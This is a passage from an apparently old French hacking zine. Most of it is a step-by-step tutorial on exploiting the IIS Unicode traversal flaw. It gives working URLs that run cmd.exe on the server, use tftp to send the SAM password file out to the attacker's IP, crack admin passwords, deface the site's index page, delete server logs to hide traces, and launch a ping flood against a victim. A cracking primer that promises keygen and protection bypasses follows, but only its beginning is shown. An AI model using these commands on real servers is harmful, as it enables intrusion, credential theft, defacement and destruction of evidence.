SRC="La%20faille%20Unicode%20IIS/2.jpg" WIDTH=918></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
srv TFTP parle :</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=270 
SRC="La%20faille%20Unicode%20IIS/3.jpg" WIDTH=383></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">C 
bon !! Ma page index.htm a bien été uploadé ! Je vais donc supprimer la page principale 
pour mettre ma "zoli" page</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=258 
SRC="La%20faille%20Unicode%20IIS/4.jpg" WIDTH=801></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Mouarf 
! Le fichier default.htm doit etre en lecture seul ou en fichier caché</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Pour 
y remedier on va créer un bat sur le srv distant puis écrire dedans via les commandes 
MS-DOS</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Voici 
le code du bat :</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">@echo 
o|attrib -r -h -a -s &gt; NUL</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Donc 
maintenant on va taper ça :</FONT></P><P ALIGN=left DIR=ltr><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">http://<FONT COLOR=#ff0000>ipdusrv</FONT>/<FONT 
COLOR=#ff0000>syntaxe</FONT>/winnt/system32/cmd.exe?/c+echo+@echoo|attrib -r -h 
-a -s &gt; NUL+&gt;&gt;+del.bat</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">C 
bon ! Le bat est crée ! Donc maintenant il faut l'éxécueter </FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Syntaxe 
: http://<FONT COLOR=#ff0000>ipdusrv</FONT>/<FONT 
COLOR=#ff0000>syntaxe</FONT>/winnt/system32/cmd.exe?/c+c:\Inetpub\wwwroot\del.bat</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=228 
SRC="La%20faille%20Unicode%20IIS/6.jpg" WIDTH=878></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Voila 
! Maintenant on supprimme puis on a defacer le serveur !</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Maintenant, 
on va virer notre trace dans les logs :</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=321 
SRC="La%20faille%20Unicode%20IIS/8.jpg" WIDTH=690></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">On 
ne peut pas les éditer ! Il nous faut les droits d'admin pour modifier les logs</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">On 
va cracker la SAM pour avoir le mot de passe de l'admin</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=426 
SRC="La%20faille%20Unicode%20IIS/9.jpg" WIDTH=630></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">On 
download la SAM avec la syntaxe suivante : http://<FONT 
COLOR=#ff0000>xxx.xxx.xxx.xxx</FONT>/<FONT 
COLOR=#ff0000>syntaxe</FONT>/winnt/system32/cmd.exe?/c+tftp.exe+"-i"+PUT+<FONT 
COLOR=#ff0000>VOTREIP</FONT>+c:\test.exe</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Après, 
vous téléchargez L0pht Crack 4 une fois fait, vous cracker la SAM :</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 HEIGHT=540 
SRC="La%20faille%20Unicode%20IIS/lc4.jpg" WIDTH=800></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Vous 
aurez après de longues heures (ça dépend ! Des fois, LC4 ne trouve pas le mdp) 
vous aurez le mdp !</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Vous 
reprenez le log de votre scan et si le port 139 (NetBios) est ouvert, vous pourrez 
avoir axx a tt le DD par : Favoris Réseau</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Vous 
allez voir appairaitre une fenetre vous demandant un login et un pass, vous utilisez 
celui que LC4 vous a trouvé. (Il faut que ça soit évidemment le mdp de la séssion 
en cours</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Vous 
avez maintenant axx a tt le disk !</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Après, 
on revient et on utilise les droits d'admin pour écrire dans les logs.</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><B><FONT COLOR="#FF0000">Fin 
d'expliquation de la methode par</FONT></B> <B><FONT COLOR="#FFFFFF">TFTP .</FONT></B></FONT></P><P ALIGN=left>&nbsp;</P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">Maintenant 
je vais commencer a expliquer le principe d'exploitation de cette faille par simple 
url .</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">la 
methode est tres simple mais aussi peut connus , donc <B><FONT COLOR="#FF0000">let's 
go again avec l'expliquation des gars de la TDC - The DarkundergrounD Clan </FONT></B></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">apres 
avoir localiser le serveur vuln&eacute;rable , et pour ca il faudra le scanner 
avec un scanner de faille UNICODE , y'en a pleins sur le net .</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">voila 
un exemple d'un serveur vuln&eacute;rable : <FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/<FONT COLOR="#CCCC00">cmd.exe?/c+dir+c:\ 
</FONT></FONT></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+dir+c:\ 
</FONT></FONT> fait appelle au serveur pour lister les donn&eacute;es qui son 
sur le lecteur C:\ , ca peut etre C:\ comme D:\ , </FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">donc 
une fois le serveur vuln&eacute;rable est localiser , pour le deffacer il nous 
faut les droits d'ecriture , pour le savoir c'est tres simple il suffit le mettre 
cette syntax &quot; <FONT COLOR="#CCCC00">cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\winnt\system32\cmd1.exe</FONT></FONT> 
<FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">&quot;a la fin .</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">ex 
: <FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT><FONT COLOR="#CCCC00">cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\winnt\system32\cmd1.exe</FONT></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">une 
fois vous avez executer cette url maintenant changer la par ceci : </FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT><FONT COLOR="#CCCC00" SIZE="2" FACE="Arial, Helvetica, sans-serif">cmd1.exe?/c+dir+c:\</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">si 
le repertoir C:\ ce liste ca veut dire que vous avez les droits en ecriture , 
alors on va faire un petit teste .</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT><FONT COLOR="#CCCC00" SIZE="2" FACE="Arial, Helvetica, sans-serif">cmd1.exe?/c+echo+hello!+&gt;+c:\test.txt</FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">ensuite 
cela :</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT><FONT COLOR="#CCCC00" SIZE="2" FACE="Arial, Helvetica, sans-serif">cmd1.exe?/c+dir+c:\</FONT></P><P ALIGN=left><IMG SRC="La%20faille%20Unicode%20IIS/10.jpg" WIDTH="599" HEIGHT="490"></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">et 
voila la pour deffacer le site c'est tres simple , deja le repertoire du site 
par defaut sur les serveurs ISS est &quot; <FONT COLOR="#FF0000">C:\<FONT COLOR="#CC9900">InetPub\wwwroot\</FONT></FONT> 
&quot; mais l'admin peut changer l'emplacement de ce dernier ou il veut dans le 
cas il faut fouiller , pour trouver les fichier <FONT COLOR="#FF0000">&quot; htm 
&quot; </FONT>peut importe cela depant de l'extension des pages sur le site .</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">voila 
comment trouver les fichers .htm : <FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT><FONT COLOR="#CCFF00">cmd1.exe?/c+dir+/S+c:\*.htm 
<FONT COLOR="#FF0000">&lt;---------</FONT> </FONT>ca c'est l'extenstion vous pouvais 
la changer par ( html , php , php3 , ) comme vous voulais .</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">une 
fois vous avec localiser le chemain du site pour le deffacer voila comment faire 
: <FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000">http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT><FONT COLOR="#CCFF00">cmd1.exe?/c+echo+Was 
Hacked by me :)+&gt;+c:\<FONT COLOR="#FF0000">chemain du repertoir du site</FONT>\index.htm 
<FONT COLOR="#FF0000">&lt;----------- </FONT></FONT>vous devais ensuite remplacer<FONT COLOR="#CCFF00"> 
<FONT COLOR="#FF0000">index.htm</FONT> </FONT>par<FONT COLOR="#CCFF00"> <FONT COLOR="#FF0000">default.htm</FONT></FONT></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF">ex 
:</FONT><FONT COLOR="#FF0000"> http://www.serveur.com/</FONT><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT><FONT COLOR="#CCFF00">cmd1.exe?/c+echo+Was 
Hacked by me :)+&gt;+c:\</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><FONT COLOR="#FF0000"><FONT COLOR="#CC9900">InetPub\wwwroot</FONT></FONT></FONT><FONT COLOR="#CCFF00">\index.htm</FONT></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">la 
tape cette url :</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"> 
http://www.serveur.com </FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">et 
bingo le site est deffacer et le chtit message</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"> 
</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">&quot;</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"> 
</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#CCFF00">Was 
Hacked by me</FONT></FONT> &quot; <FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">est 
sur la page d'accueil</FONT></P><P ALIGN=left>&nbsp;</P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">maintenant 
il faut effacer cs traces , pour ca il faut trouver le dossier qui contien les 
loges voila son chemain par defaut : <FONT COLOR="#CCFF00">C:\WINNT\SYSTEM32\LOGFILES\W3SVC32 
</FONT></FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">ensuite faites 
:</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"> </FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#CCFF00">cmd1.exe?/c+del+/S+c:\*.log 
</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">et voila les logs son 
supprimer</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> ;)</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><B><FONT COLOR="#FF0000">Bonus 
: <FONT COLOR="#FFFFFF">pour faire une attaque DOS Denial of Service :</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000"> 
</FONT></FONT></FONT></FONT></B></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FF0000">http://www.serveur.com</FONT></FONT></FONT>/</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF">scripts/..%c1%1c../winnt/system32/</FONT></FONT></FONT><FONT COLOR="#CCFF00">cmd.exe 
/c+ping.exe+&quot;-v&quot;+igmp+&quot;-t&quot;+&quot;l&quot;+30000+ [<B><FONT COLOR="#FF0000">victime</FONT></B>]+&quot;n&quot;+500+&quot;-w&quot;+10 
502 -</FONT></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">et 
voila c'est fini .</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">astuces 
: </FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+dir+c:\</FONT></FONT></FONT> 
= lister le repertoire C:\ </P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+type+c:\ 
</FONT></FONT>= pour lire un fichier ex <FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">:</FONT><FONT COLOR="#FFFFFF"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00"> 
c+type+c:\</FONT></FONT></FONT></FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">chemain\</FONT><FONT COLOR="#FFFFFF"><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#FF0000">fichier</FONT></FONT></FONT></FONT></FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+del+c:\ 
</FONT></FONT>= pour effacer un fichier</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+echo+c:\ 
</FONT></FONT>= pour ecrire</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+get+c:\ 
</FONT></FONT>= pour telecharger un ficher</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><FONT COLOR="#FFFFFF"><FONT COLOR="#CCCC00">c+put+c:\ 
</FONT></FONT>= pour transferer un fichers</FONT></P><P ALIGN=left><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"><B>Pour 
patcher son serveur :</B></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Pour 
IIS 4.0 :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> <A HREF="http://www.microsoft.com/ntserver/nts/downloads/critical/q269862/">http://www.microsoft.com/ntserver/nts/downloads/critical/q269862/</A></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Pour 
IIS 5.0 :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> <A HREF="http://www.microsoft.com/windows2000/downloads/critical/q269862/">http://www.microsoft.com/windows2000/downloads/critical/q269862/</A></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">pour 
autres windoz updates :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
<A HREF="http://security.alldas.de/patches/?op=detail&distribution=Windows">http://security.alldas.de/patches/?op=detail&amp;distribution=Window</A></FONT><A HREF="http://security.alldas.de/patches/?op=detail&distribution=Windows">s</A></P><P><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">et 
voila j'espere que j'etais assez claire &amp; have fun <B>( PS : ne faites pas 
les cons a deffacer des sites pour le plaisir comme des </B> <I><FONT COLOR="#FF0000">scripts 
keddies</FONT></I> <B>)</B></FONT></P><P ALIGN="CENTER"><B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
ISS UNICODE Exploit By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> 
<A HREF="mailto:alex.bone@caramail.com">A-bone</A> <FONT COLOR="#FF0000">:::...</FONT></FONT></B></P><P><BR></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>4 . Craking<BR>===================================================================== 
</FONT></P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Voici 
un hors-s&eacute;rie tel que vous n'en avez jamais vu. Dans ce num&eacute;ro sp&eacute;cial, 
on va pas parler de &quot; un peu &quot; &agrave; &quot; tr&egrave;s &quot; technique. 
Ce Best Of Cracking est fait pour ceux qui, &agrave; force de lire ce mot, sont 
d&eacute;moralis&eacute; car il n'y pige rien. Au sommaire :<BR>- Newbie: ASM 
For Cracking: cours d'ASM <BR>- Introduction au Reversing, le &quot; Cracking 
l&eacute;gal &quot;.<BR>- Cr&eacute;ation de votre propre KEYGEN pour DreamWeaver.<BR>- 
For Elite : le Cracking EXCLUSIF du syst&egrave;me WFP (Windows File Protection) 
sous Win 2000.<BR>- CRACKING BIOS PASSWORD: comment craquer le mot de passe BIOS 
?</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Cette 
s&eacute;rie d'article est l&agrave; pour vous tendre la main et vous faire grimper 
la montagne qui vous s&eacute;pare des d&eacute;butants .<BR>Ready for Cracking 
? Let's go .<BR></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Salut 
les Toons. Pour d&eacute;buter cet HS CRACKING, commen&ccedil;ons cool par un 
petit cours sur l'ASM indispensable. Vous ne pourrez cracker bien sans &ccedil;a. 
Ready? Let's go!</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">GENERALITES<BR>---------------------------<BR>- 
Comment un cracker peut lire un programme et le modifier, ind&eacute;pendamment 
de son langage originel?<BR>Quand un programmeur r&eacute;alise une application, 
il l'&eacute;crit avec un langage ayant une syntaxe propre. Puis, il le compile, 
c'est-&agrave;-dire qu'il transforme le code source sp&eacute;cifique au langage 
en &quot;code machine&quot;, ou assembleur. Le langage des processeur d'Intel 
est l'assembleur ix86. Il y en a d'autre comme celui des Ti-92 (assembleur Motorola 
68000). Nous, on va s'int&eacute;resse &agrave; l'assembleur i386, qui est quasiment 
identique &agrave; celui de ix86.<BR>- un fichier sur votre disque dur est &quot;en 
assembleur&quot;. En l'ouvrant sous Edit, vous n'aurez pas des instructions d'assembleur, 
mais les caract&egrave;res ASCII correspondants &agrave; celle-l&agrave;. Pour, 
pouvoir traduire le programmeur en code machine compr&eacute;hensible par l'homme 
,il faut un &quot;d&eacute;sassembleur&quot;. On va utiliser le meilleur, W32Dasm 
8.9, qui permet de d&eacute;sassembler<BR>les applications Windows.<BR>- A l'&eacute;poque 
de MS-DOS (et des Goupils tout naze), le syst&egrave;me d'exploitation avait une 
biblioth&egrave;que d'interruption &agrave; disposition des programmes. AInsi, 
le fonction 9 de l'interruption 21h permet afficher un message &agrave; l'&eacute;cran. 
Sous Windows, pour faire une comparaison TRES grossi&egrave;re, l'API remplace 
les interruptions. ex: la fonction de l'API GetWindowText(HWND, LPTSTR, int) copie 
le texte d'un contr&ocirc;le vers un buffer.<BR>- Pour comprendre comment marche 
un programme d&eacute;j&agrave; compil&eacute;, il faut un d&eacute;sassembleur. 
Mais un d&eacute;buggeur permettant d'ex&eacute;cuter les instructions en assembleur 
pas-&agrave;-pas, du style Turbo d&eacute;buggeur (de Borland). Le meilleur est 
Soft-Ice. On ex&eacute;cute le programme, et, par une simple combinaison de touches, 
on le stoppe quand on veut. Le crackeur peut placer des &quot;breakpoints&quot; 
pour que le programme s'arr&ecirc;te s'il ex&eacute;cute une certaine action (comme 
l'affichage d'un message d'erreur parce qu'on a rentr&eacute; le mauvais num&eacute;ro 
de s&eacute;rie:). Sous Windows, on peut le faire sur n'importe quel programme 
avec le multit&acirc;ches. Les breakpoints sont donc indispensable parce qu'on 
on n'est pas sur, quand on ex&eacute;cute Soft-Ice, que le processus en cours 
appartient au programme &agrave; craquer. on reviendra dessus plus tard.<BR> <BR>FONCTIONNEMENT 
D'UN ORDINATEUR<BR>------------------------------------------------------------------------<BR>L'alphabet 
d'un ordinateur est limit&eacute; &agrave; 0 et 1 qui correspond &agrave; un &eacute;tat 
&eacute;lectrique, &eacute;teint, allum&eacute;, &eacute;tat qui est repr&eacute;sent&eacute; 
par un bit. Pour &eacute;tendre les possibilit&eacute;s, on les r&eacute;unis 
ensemble pour former un octets (ou BYTE, 8 bits), un mot (ou WORD, 16 bits) ou 
un double mot (ou DWORD, 32 bits). Le processeur doit ex&eacute;cuter des donn&eacute;es 
num&eacute;riques ou des caract&egrave;res (l'ensemble des caract&egrave;res et 
de leur combinaisons est appel&eacute; la SEQUENCE ASCII) via des instructions 
(un ensemble d'instruction est appel&eacute; un &quot;set&quot; d'instructions).<BR>**DONNES 
NUMERIQUES**<BR>C'est plus complexe pour elles. Sur un byte (ou octet) on pourrait 
repr&eacute;senter 256 (2^8) nombres mais ce n'est pas suffisant. Il faut ensuite 
que le syst&egrave;me puisse supporter les op&eacute;rations arithm&eacute;tiques, 
les nombres n&eacute;gatifs... <BR>**LE BINAIRE**<BR>On conna&icirc;t la base 
10 ou d&eacute;cimale qui permet d'obtenir tous les nombres souhait&eacute;s en 
combinant simplement une s&eacute;rie de chiffres entre 0 et 9. Pour le binaire, 
on a que deux signes : 0 et 1, on est donc en base 2. La m&eacute;thode est de 
combiner une s&eacute;rie de 0 et 1, puis multiplier cela le plus &agrave; droit 
pas 2^0, et, de gauche &agrave; gauche, par 2^1, 2^2... ce qui donne<BR>base 2	
base 10<BR>00000011 = 1 = 1*2 + 1*1<BR>00001011 = 11 = 1*8 + 0*4 + 1*2 + 1*1<BR>00011011 
= 27 = 1*16 + 1*8 + 0*4 + 1*2 + 1*1<BR>(2^0 est toujours &eacute;gal &agrave; 
1, mais si en plus vous ne connaissait pas les maths ;)<BR> Sur 1 Byte (8 bits), 
le nombre maximum qui peut &ecirc;tre repr&eacute;sent&eacute; est: 11111111 = 
255 = 2^8-1. Pour avoir plus, on devra utiliser plusieurs bytes et on aura cette 
forme : ((2^nb de bits)-1). ex: 2^32-1 pour 4 bytes...<BR>**LES NOMBRES NEGATIFS**<BR>Pour 
les nombres relatifs, comme on a que deux possibilit&eacute;s (+ ou -), le signe 
sera d&eacute;termin&eacute; par 1 bit. On admet alors que, par convention, le 
bit de fauche d'un ensemble de bits sera le bit de signe : 1=+ et 0=-. On a donc 
2^7 bits repr&eacute;sentables pour un bytes, 2^15 pour un WORD... donc 2^(nb 
bits - 1) repr&eacute;sentables.<BR>**L'HEXADECIMAL**<BR>Une derni&egrave;re notation 
est l'hexad&eacute;cimal, en base 16. Comme on travaille en souvent avec des chiffres 
sur 2 bytes (16 bits), on est sujets &agrave; moins d'erreurs en prenant une base 
16, ce qui r&eacute;duit la quantit&eacute; de chiffres &agrave; manipuler. 16 
&eacute;tant une puisse de 2, la conversion binaire/hexa est simple : &agrave; 
quatre signe binaires correspond un signe hexa. Comme on a que 10 chiffres les 
autres seraient les 6 premi&egrave;res lettres de l'alphabet soit A(=10),B(=11),C(=12),D(=13),E(=14),F(=15) 
et 10h=16 (h veut dire hexa). exemple : 9h=09;10h=0A;11h=0F<BR>**LA MERMOIRE**<BR>C'est 
une s&eacute;rie d'emplacement num&eacute;rot&eacute;s contenant chacun un nombre. 
Le num&eacute;ro d'un emplacement (un byte) est une adresse. Sur les PC, la m&eacute;moire 
est divis&eacute;e en zone de 65536 bytes appel&eacute;es segments. L'adresse 
d'un byte comporte alors deux &eacute;l&eacute;ments : un num&eacute;ro de segment 
et un d&eacute;placement ou offset calcul&eacute; par rapport au d&eacute;but 
du segment; on a donc: Segment:Offset.<BR>exemple : 0A000H :00000H (adresse de 
la m&eacute;moire vid&eacute;o). Le microprocesseur peut soit consulter soit modifier 
le contenu d'un emplacement, c'est tout. Les adresses sont toujours num&eacute;rot&eacute;s</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">L'ASSEMBLEUR<BR>------------------------------<BR>Une 
instruction ASM s'appelle une &quot;mn&eacute;monique&quot;. Le processeur travaille 
avec des registres.<BR>---1. Les registres---<BR>Ce sont des petits emplacements 
m&eacute;moire dans le processeur qu'il manipule comme le veut le programmeur. 
Normalement, leur taille est 16 bits (8 bits=1 octet). Avec les 386, ils font 
32 bits. Pour utiliser les 32 bits, il faut placer un &quot;E&quot; avant le nom 
du registre. Il y a 4 classes de registres:</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">a) 
Les registres de travail (ax, bx, cx, dx)<BR>ax : l'accumulateur, pour les op&eacute;rations 
arithm&eacute;tiques<BR>bx : registre de base<BR>cx : le compteur, pour les instructions 
de boucles, du genre &quot;loop&quot;<BR>dx : le registre de &quot;data&quot;<BR>chak1 
est divise en 2: ax en al et ah, bx en bl et bh, etc</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">b) 
Les registres de segment<BR>CS : code segment. Il contient l'adresse du segment 
de m&eacute;moire qui contient le code machine<BR>DS : data segment. Il contient 
l'adresse du segment ayant les data du programme<BR>SS : stack segment. Il contient 
l'adresse du segment de pile<BR>ES : extra segment. Il contient l'adresse d'un 
segment suppl&eacute;mentaire</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">c) 
Les registres d'offset<BR>Ces 5 registres contiennent une valeur &agrave; combiner 
avec un registre de segment pour former une adresse m&eacute;moire segment:offset<BR>SI 
: source index, pour les op&eacute;rations sur les cha&icirc;nes de caract&egrave;res. 
Il est associ&eacute; &agrave; DS pour former l'adresse DS:SI<BR>DI : destination 
index. associ&eacute; &agrave; DS ou &agrave; ES pour op&eacute;rations sur les 
cha&icirc;nes de caract&egrave;re.<BR>IP : Instruction pointer. associ&eacute; 
&agrave; CS pour pointer sur l'1struction suivante &agrave; ex&eacute;cuter. Impossible 
&agrave; modifier directement.<BR>BP : base pointer. Associ&eacute; &agrave; SS, 
il permet d'acc&eacute;der &agrave; la pile (stack) lors d'appels de sous programmes.<BR>SP 
: associ&eacute; &agrave; SS, SS:SP indique le dernier &eacute;l&eacute;ment de 
la pile.</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">d) 
Le registre de flags<BR>- Le registre FLAG est un registre d'&eacute;tat. Il sont 
utiliser lors de saut conditionnel entre autres. Ce registres est manipul&eacute; 
bit par bit, chaque bit &eacute;tant appel&eacute; &quot;indicateurs&quot;. On 
des indicateurs d'&eacute;tat et de contr&ocirc;ler. Voyons la signification de 
chaque bit:<BR>- Indicateurs d'&eacute;tat<BR>0 : &quot;Carry&quot; : CF. Il est 
mis &agrave; 1 s'il y a eu retenue lors de la derni&egrave;re instruction arithm&eacute;tique.<BR>2 
: Parit&eacute; : PF. Il est mis &agrave; un si le r&eacute;sultat d'un op&eacute;ration 
contient un nombre pairs de bits 1.<BR>4 : Retenue auxiliaire : AF.<BR>6 : Z&eacute;ro 
: ZF. Il est activ&eacute; si le r&eacute;sultat d'une op&eacute;ration donne 
0 et le restera jusqu'&agrave; la prochaine op&eacute;ration.<BR>7 : Signe : SF. 
